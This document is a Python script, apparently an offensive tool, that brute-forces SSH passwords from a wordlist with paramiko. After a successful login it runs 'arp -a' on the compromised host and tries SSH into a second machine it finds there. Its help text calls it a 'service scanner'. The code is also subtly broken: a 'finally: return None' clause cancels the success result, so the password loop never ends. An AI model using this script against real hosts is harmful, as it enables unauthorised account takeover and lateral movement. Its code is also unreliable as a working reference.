#!/usr/bin/env python
import argparse
import threading
import paramiko
import subprocess
import multiprocessing
from multiprocessing import Process, Queue, Manager
import getpass
import os

isFound = False
def execute_commands():
    # check for connected devices
    sdtin, stdout, stderr = ssh.exec_command('arp -a') # execute code
    print("Executing 'arp -a' command on first remote system, this may take a minute.")
    for line in stdout.readlines():
        #print(line.strip())
        line=line.strip()
        if 'eth1' in line and not 'incomplete' in line:
            new = line.split('(',1)      # print out the output
            new = new[1].split(')',1)
            new = new[0]
            #print(new)
            print('Arp revealed second system at {}' .format(new))
            print('Trying new system using ssh {}@{}'.format(args.user,new))
            sdtin, stdout, stderr = ssh.exec_command('ssh {}@{}'.format(args.user,new))
            print('Proof {}'.format(stdout))

def attack_ssh(ip,user,passwd):
    try:                                               # try to make a connection
        ssh.connect(ip, username=user, password= passwd)
        print('Password found: {}'.format(passwd))   
        execute_commands()
        ssh.close()                                     # close the connection
        return 1
    except:                                             # if no connection is made then pass
        pass
    finally:
        return None
    return None

def file_lengthy(fname):
        with open(fname) as f:
                for i, l in enumerate(f):
                        pass
        return i + 1  

if __name__ == "__main__":
    parser = argparse.ArgumentParser(prog='scan',
                                    add_help=True,
                                    description='A multi-process service scanner')
    parser.add_argument('-file','-f', required=True,help='location of wordlist')
    parser.add_argument('-ip','-i',required=True,help='Target IP Address')
    parser.add_argument('-user','-u', required=True,nargs='?',help='username')

    args = parser.parse_args()
    ssh = paramiko.SSHClient()                         #set up ssh client
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  #This will add the host key if you are connecting to a server for the first time

    here = os.path.dirname(os.path.abspath(__file__))
    filename = os.path.join(here,args.file)
    print('Trying {} passwords.'.format(file_lengthy(filename)))
    f = open(filename).readlines() # open password list
    while isFound == False:
        for passwd in f:
            print(passwd.strip())
            check = attack_ssh(args.ip,args.user,passwd.strip())
            if check != None:
                print()
                print('Password is: {}'.format(passwd))
                os._exit(0)
    # except:
    #     print('{} not found.'.format(args.file))


    #connect_to_ip(args)
    #print(args)
